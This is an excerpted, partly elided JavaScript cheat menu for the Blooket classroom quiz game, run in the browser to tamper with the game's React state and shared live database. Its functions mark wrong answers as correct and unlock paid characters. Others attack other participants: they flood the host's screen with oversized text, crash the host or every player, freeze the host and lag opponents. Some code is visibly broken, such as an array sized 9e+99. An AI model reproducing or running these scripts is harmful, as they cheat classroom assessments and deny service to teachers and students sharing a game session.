(async () => {
    ...
    if (console.log("%c Lucius' Blooket Mod Menu / Cheats %c\n	Made & Modified By: Lucius Bruce Butson", "color: #0bc2cf; font-size: 3rem", "color: #8000ff; font-size: 1rem"), console.log("%c	Lucius' Blooket GUI.js", "color: #0bc2cf; font-size: 1rem"), console.log("%c	Star The Github Repo!%c https://github.com/charlottebutson-pixel/Lucius-Blooket-Cheats", "color: #ffd000; font-size: 1rem", ""), document.querySelector("script[src*='bfs/index.js']") && !window.clearId) {
    ...
    let c = {
        ...
        setItem(e, t) {
            return e.split(".").reduce((e, a, o, r) => (e[a] = (e[a] ? e[a] : {}), ++o == r.length && (e[a] = t), e[a]), this.data),
                localStorage.setItem("LuciusGUISettings", JSON.stringify(this.data)),
                this.data
        },
        deleteItem(e) {
    ...
    try {
        for (let d of (c.data = JSON.parse(localStorage.getItem("LuciusGUISettings") || "{}"), ["backgroundColor", "cheatList", "contentBackground", "defaultButton", "disabledButton", "enabledButton", "infoColor", "inputColor", "textColor"]))
    ...
    let p,
        ...
        _ = l("div", {
            ...
            innerHTML: '<span style="text-shadow: 1px 1px rgb(0 0 0 / 40%); font-size: 0.8em;">Lucius\' Mod Menu <sup>v1.0</sup></span>'
        }, ), l("div", {
    ...
    let C = {
        global: [{
            ...
            description: "Sets a load of text as your blook and floods the masters screen on lobby",
            inputs: [{
                name: "Text",
                type: "input",
            }],
            ...
            name: "Unlock All Blooks",
            description: "Allows you to play as any blook by unlocking them all.",
            run: function() {
                (() => {
                    const stateNode = Object.values(document.querySelector('#app>div>div'))[1].children[0]._owner.stateNode;
                    let i = document.createElement('iframe');
            ...
            run: function() {
                const encodedChars = [
                    '\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2', '\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2', '\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2', '\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2', '\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2', '\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2'
                ];
                ...
                function makeLongText2() {
                    return new Array(9e+99).fill().map(e => chars[Math.floor(Math.random() * chars.length)]).join("");
                }
                ...
                let repeatedText = makeLongText() + makeLongText2();
                t.client.blook = repeatedText;
                t.liveGameController.setVal({
                    path: `c/${t.client.name}/b`,
                    val: repeatedText
            ...
            name: "Crash Host V1 (Global)",
            description: "Attempts to crash the Host's Game in any gamemode, may not work.",
            run: function() {
            ...
            name: "Crash Host V2 (Global)",
            description: "Attempts to crash the Host's Game in any gamemode, may crash you.",
            run: function() {
                function reactHandler() {
                    return Object.values(document.querySelector('#app>div>div'))[1].children[0]._owner;
                }
                ...
                setv(['Y/t', 't']);
                setv(['Z/t', 't']);
                setv(['abcdefghijklmnopqrstuvwxyz/t', 't']);
                setv(['ABCDEFGHIJKLMNOPQRSTUVWXYZ/t', 't']);
                setv(['123456789/t', 't']);
                setv(['0123456789/t', 't']);
                setv(['1234/t', 't']);
            ...
            description: "Removes all taken blooks, allowing you to use any taken blook. Only works in lobby obviously.",
            run: function() {
                const stateNode = Object.values(document.querySelector("#app>div>div"))[1].children[0]._owner.stateNode;
                stateNode.setState({
                    takenBlooks: {
            ...
            name: "Lobbychat",
            description: "Chat with other people using this mod and execute commands which are shortcuts for mods.",
            run: function() {
                if (window.run) {
                    return;
                } else {
            ...
            description: "Sets every answer to be correct (wrong answers are now correct, only button questions work not text questions)",
            run: function() {
                let {
                    stateNode: e
                } = Object.values(function e(t = document.querySelector("body>div")) {
            ...
            name: "Break Name Limit",
            description: "Sets the name limit to 9999999999, which is more than the max and actual max name length limits",
            run: function() {
                var e = document.createElement("iframe");
                document.body.append(e),
                    window.alert = e.contentWindow.alert.bind(window),
                    e.remove(),
                    document.querySelector('input[class*="nameInput"]').maxLength = 9999999999,
                    alert("Broke name length limit"),
                    window.alert("Broke name length limit")
            }
        }, {
            name: "Remove Random Name",
            description: "Allows you to put a custom name by replacing the html code",
            run: function() {
        ...
        crypto: [{
            ...
            run: function() {
                ...
                if (this.enabled) {
                    ...
                    this.data = setInterval(lagFunction, 10);
                }
            }
        }, {
            name: "Lag Password V2",
            description: "Lags other players when they attempt to hack you",
            type: "toggle",
            enabled: !1,
            data: null,
            run: function() {
                ...
                if (this.enabled) {
                    ...
                    this.data = setInterval(lagFunction, 60);
                }
            }
        }, {
        ...
        host: [{
            ...
            name: "Crash All Players",
            description: "Attempts to crash all players in your game.",
            run: async () => {
                const sn = Object.values(document.querySelector('#app>div>div'))[1].children[0]._owner.stateNode;
                const db = await sn.props.liveGameController.getDatabaseVal("");
                sn.props.liveGameController.setVal({
        ...
        rush: [{
            ...
            name: "Freeze Host V1",
            description: "Freezes the host. This could be permanent!",
            run: function() {
            ...
            description: "Freezes the host. This could be permanent!",
            run: function() {
                var largeNumber = "";
                var t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                t.setState({
                    numBlooks: largeNumber
                });
        ...
        credits: [{
            name: "Lucius Bruce Butson",
            description: "This Mod Menu Was Made By: Lucius Bruce Butson!",
            run: function() {
            }
        }, {
            name: "05Konz",
            description: "Made some of the mods and helped with some code, also made the mod menu gui template!",
            run: function() {
            }
        }],
        alerts: [{
   ...
   w("Alerts", "https://res.cloudinary.com/dhiws7ac5/image/upload/v1743434255/alerts_dsucpi.png", C.alerts, !0),
        ...
        w("Credits", "https://res.cloudinary.com/dhiws7ac5/image/upload/v1743434333/extras_jvb85e.png", C.credits, !0),
